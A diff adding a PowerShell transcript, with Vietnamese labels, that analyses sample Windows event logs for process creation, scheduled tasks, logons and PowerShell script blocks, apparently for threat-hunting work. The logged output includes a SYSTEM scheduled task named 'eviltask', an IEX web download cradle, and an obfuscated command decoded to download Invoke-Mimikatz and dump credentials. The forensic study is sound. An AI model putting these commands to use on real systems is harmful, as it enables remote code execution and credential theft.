@@ -1,0 +1,49 @@
+PS> evtx-rec mau/dbc-many-events-security.evtx | ConvertFrom-Json | Where-Object { $_.id -eq 4688 -and $_.data.NewProcessName -like '*\cmd.exe' -and $_.data.CommandLine } | Select-Object -First 1 | ForEach-Object { $_.data | Format-List }
+SubjectUserSid     : S-1-5-18
+SubjectUserName    : IE10WIN7$
+SubjectDomainName  : WORKGROUP
+SubjectLogonId     : 0x3e7
+NewProcessId       : 0xc80
+NewProcessName     : C:\Windows\System32\cmd.exe
+TokenElevationType : %%1936
+ProcessId          : 0x618
+CommandLine        : C:\Windows\system32\cmd.exe /c ""C:\Program Files\VMware\VMware Tools\resume-vm-default.bat""
+PS> foreach ($f in 'mau/dbc-many-events-security.evtx','mau/security_big_sample.evtx','mau/2-system-Security-dirty.evtx') { $e = evtx-rec $f 2>$null | ConvertFrom-Json | Where-Object id -eq 4688; '{0,-34} 4688: {1,5}   có trường CommandLine: {2,5}   trong đó rỗng: {3,4}' -f $f, $e.Count, @($e | Where-Object { $_.data.PSObject.Properties.Name -contains 'CommandLine' }).Count, @($e | Where-Object { $_.data.PSObject.Properties.Name -contains 'CommandLine' -and -not $_.data.CommandLine }).Count }
+mau/dbc-many-events-security.evtx  4688:  8346   có trường CommandLine:  7671   trong đó rỗng:  199
+mau/security_big_sample.evtx       4688:   382   có trường CommandLine:     0   trong đó rỗng:    0
+mau/2-system-Security-dirty.evtx   4688:   154   có trường CommandLine:   154   trong đó rỗng:  154
+PS> evtx-rec mau/2-system-Security-dirty.evtx 2>$null | ConvertFrom-Json | Where-Object id -eq 4688 | Group-Object { '{0} <- {1}' -f ($_.data.NewProcessName -split '\\')[-1], ($_.data.ParentProcessName -split '\\')[-1] } | Sort-Object Count -Descending | Select-Object -First 6 Count,@{n='Con <- Cha';e={$_.Name}} | Format-Table -AutoSize
+Count Con <- Cha
+----- ----------
+   28 csrss.exe <- smss.exe
+   28 smss.exe <- smss.exe
+   14 autochk.exe <- smss.exe
+   14 lsass.exe <- wininit.exe
+   14 Registry <-
+   14 services.exe <- wininit.exe
+PS> evtx-rec tc/task-4698.evtx | ConvertFrom-Json | Where-Object id -eq 4698 | ForEach-Object { '{0}  {1} tạo tác vụ {2}' -f $_.t.ToString('s'), $_.data.SubjectUserName, $_.data.TaskName; ([xml]$_.data.TaskContent).Task | ForEach-Object { 'Chạy: ' + $_.Actions.Exec.Command; 'Lặp: ' + $_.Triggers.TimeTrigger.Repetition.Interval; 'Dưới quyền: ' + $_.Principals.Principal.UserId } }
+2021-04-21T13:30:00  admmig tạo tác vụ \eviltask
+Chạy: C:\tools\shell.cmd
+Lặp: PT1M
+Dưới quyền: S-1-5-18
+PS> evtx-rec tc/task-4624-4702.evtx | ConvertFrom-Json | Where-Object id -in 4624,4702 | ForEach-Object { '{0}  {1}  {2,-17} type={3,-2} ip={4,-14} logonId={5}' -f $_.t.ToString('HH:mm:ss.fff'), $_.id, ($_.data.TargetUserName + $_.data.TaskName), $_.data.LogonType, $_.data.IpAddress, $(if ($_.id -eq 4624) { $_.data.TargetLogonId } else { $_.data.SubjectLogonId }) } | Select-Object -First 4
+11:47:48.570  4624  a-jbrown          type=3  ip=172.16.66.142  logonId=0x21a8c68
+11:47:48.823  4624  a-jbrown          type=3  ip=172.16.66.142  logonId=0x21a8c80
+11:47:48.842  4624  a-jbrown          type=3  ip=172.16.66.142  logonId=0x21a8c9a
+11:47:48.959  4702  \LMST             type=   ip=               logonId=0x21a8c68
+PS> evtx-rec tc/task-4624-4702.evtx | ConvertFrom-Json | Where-Object id -eq 4702 | ForEach-Object { ([xml]$_.data.TaskContentNew).Task | ForEach-Object { 'Chạy: {0} {1}' -f $_.Actions.Exec.Command, $_.Actions.Exec.Arguments; 'Dưới quyền: {0}, RunLevel: {1}' -f $_.Principals.Principal.UserId, $_.Principals.Principal.RunLevel } }
+Chạy: cmd.exe /c echo testing > c:\users\public\out.txt
+Dưới quyền: SYSTEM, RunLevel: HighestAvailable
+PS> evtx-rec tc/ps-tai-payload.evtx | ConvertFrom-Json | ForEach-Object { '{0}  {1}  {2,-7}  {3}' -f $_.t.ToString('HH:mm:ss'), $_.id, $_.muc, $(if ($_.id -eq 4104) { $_.data.ScriptBlockText } else { ($_.data.Payload -split "`r?`n")[0] }) }
+20:11:11  4104  Verbose  "IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')"
+20:11:11  4103  Information  CommandInvocation(Out-Default): "Out-Default"
+20:11:11  4104  Verbose  prompt
+PS> evtx-rec tc/ps-obfuscation.evtx | ConvertFrom-Json | Group-Object muc | Select-Object Count,Name | Format-Table -AutoSize
+Count Name
+----- ----
+   64 Verbose
+    2 Warning
+PS> evtx-rec tc/ps-obfuscation.evtx | ConvertFrom-Json | Select-Object -First 1 | ForEach-Object { $s = $_.data.ScriptBlockText; $s.Substring(0, 110); '...'; $so = [regex]::Matches($s, '\d+') | ForEach-Object { [int]$_.Value } | Where-Object { $_ -ge 32 -and $_ -lt 127 }; 'Giải mã: ' + (-join ($so | ForEach-Object { [char]$_ })) }
+ & ( $eNv:COmSPEc[4,15,25]-JoIN'') ([ChAr[]] (73, 69 , 88 ,32 ,40,78 ,101 ,119 ,45, 79, 98,106 ,101,99 , 116 ,
+...
+Giải mã: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
